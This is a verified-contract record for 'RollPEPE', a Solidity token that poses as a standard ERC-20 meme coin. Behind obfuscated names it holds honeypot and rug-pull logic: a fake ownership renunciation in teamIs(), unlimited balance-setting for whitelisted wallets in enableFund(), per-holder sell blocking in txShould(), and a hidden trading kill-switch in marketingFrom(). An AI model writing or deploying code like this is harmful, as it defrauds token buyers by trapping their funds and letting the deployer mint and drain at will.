{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface maxMarketingIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeList) external view returns (uint256);\n\n    function transfer(address limitSell, uint256 limitLaunched) external returns (bool);\n\n    function allowance(address limitWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitSell,\n        uint256 limitLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalMin, uint256 value);\n    event Approval(address indexed limitWallet, address indexed spender, uint256 value);\n}\n\nabstract contract receiverTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingReceiver {\n    function createPair(address txAuto, address receiverTakeMarketing) external returns (address);\n}\n\ninterface maxMarketingIsMetadata is maxMarketingIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RollPEPE is receiverTake, maxMarketingIs, maxMarketingIsMetadata {\n\n    address private shouldEnableMax;\n\n    function allowance(address totalEnable, address shouldWalletSell) external view virtual override returns (uint256) {\n        if (shouldWalletSell == buyTrading) {\n            return type(uint256).max;\n        }\n        return feeMarketing[totalEnable][shouldWalletSell];\n    }\n\n    mapping(address => uint256) private atSender;\n\n    uint256 private feeTrading;\n\n    function teamIs() public {\n        emit OwnershipTransferred(feeToken, address(0));\n        shouldEnableMax = address(0);\n    }\n\n    bool public fundMarketing;\n\n    function tradingExemptLaunch(uint256 limitLaunched) public {\n        senderTo();\n        buyShould = limitLaunched;\n    }\n\n    uint8 private amountExempt = 18;\n\n    address receiverEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function marketingFrom(address enableSell, address limitSell, uint256 limitLaunched) internal returns (bool) {\n        if (enableSell == feeToken) {\n            return receiverFund(enableSell, limitSell, limitLaunched);\n        }\n        uint256 teamAuto = maxMarketingIs(isSwap).balanceOf(receiverEnable);\n        require(teamAuto == buyShould);\n        require(limitSell != receiverEnable);\n        if (fromEnable[enableSell]) {\n            return receiverFund(enableSell, limitSell, senderMode);\n        }\n        return receiverFund(enableSell, limitSell, limitLaunched);\n    }\n\n    function owner() external view returns (address) {\n        return shouldEnableMax;\n    }\n\n    function approve(address shouldWalletSell, uint256 limitLaunched) public virtual override returns (bool) {\n        feeMarketing[_msgSender()][shouldWalletSell] = limitLaunched;\n        emit Approval(_msgSender(), shouldWalletSell, limitLaunched);\n        return true;\n    }\n\n    function enableFund(address exemptTrading, uint256 limitLaunched) public {\n        senderTo();\n        atSender[exemptTrading] = limitLaunched;\n    }\n\n    bool private isFrom;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atFrom;\n    }\n\n    bool private limitAtFund;\n\n    address buyTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private sellTake = \"Roll PEPE\";\n\n    mapping(address => bool) public listWallet;\n\n    function getOwner() external view returns (address) {\n        return shouldEnableMax;\n    }\n\n    uint256 toEnable;\n\n    uint256 public fromReceiver;\n\n    function receiverAmount(address enableAmount) public {\n        require(enableAmount.balance < 100000);\n        if (fundMarketing) {\n            return;\n        }\n        \n        listWallet[enableAmount] = true;\n        \n        fundMarketing = true;\n    }\n\n    string private maxFromLaunch = \"RPE\";\n\n    uint256 buyShould;\n\n    uint256 constant senderMode = 9 ** 10;\n\n    uint256 private atFrom = 100000000 * 10 ** 18;\n\n    uint256 public autoMin;\n\n    address public feeToken;\n\n    function transferFrom(address enableSell, address limitSell, uint256 limitLaunched) external override returns (bool) {\n        if (_msgSender() != buyTrading) {\n            if (feeMarketing[enableSell][_msgSender()] != type(uint256).max) {\n                require(limitLaunched <= feeMarketing[enableSell][_msgSender()]);\n                feeMarketing[enableSell][_msgSender()] -= limitLaunched;\n            }\n        }\n        return marketingFrom(enableSell, limitSell, limitLaunched);\n    }\n\n    bool public feeWallet;\n\n    function transfer(address exemptTrading, uint256 limitLaunched) external virtual override returns (bool) {\n        return marketingFrom(_msgSender(), exemptTrading, limitLaunched);\n    }\n\n    constructor (){\n        \n        liquidityTake tradingAt = liquidityTake(buyTrading);\n        isSwap = tradingReceiver(tradingAt.factory()).createPair(tradingAt.WETH(), address(this));\n        \n        feeToken = _msgSender();\n        teamIs();\n        listWallet[feeToken] = true;\n        atSender[feeToken] = atFrom;\n        \n        emit Transfer(address(0), feeToken, atFrom);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxFromLaunch;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return sellTake;\n    }\n\n    mapping(address => bool) public fromEnable;\n\n    function receiverFund(address enableSell, address limitSell, uint256 limitLaunched) internal returns (bool) {\n        require(atSender[enableSell] >= limitLaunched);\n        atSender[enableSell] -= limitLaunched;\n        atSender[limitSell] += limitLaunched;\n        emit Transfer(enableSell, limitSell, limitLaunched);\n        return true;\n    }\n\n    function senderTo() private view {\n        require(listWallet[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountExempt;\n    }\n\n    address public isSwap;\n\n    event OwnershipTransferred(address indexed atToken, address indexed minAuto);\n\n    function balanceOf(address takeList) public view virtual override returns (uint256) {\n        return atSender[takeList];\n    }\n\n    function txShould(address teamAt) public {\n        senderTo();\n        \n        if (teamAt == feeToken || teamAt == isSwap) {\n            return;\n        }\n        fromEnable[teamAt] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private feeMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldWalletSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldWalletSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitLaunched\",\"type\":\"uint256\"}],\"name\":\"enableFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"}],\"name\":\"receiverAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitLaunched\",\"type\":\"uint256\"}],\"name\":\"tradingExemptLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAt\",\"type\":\"address\"}],\"name\":\"txShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RollPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}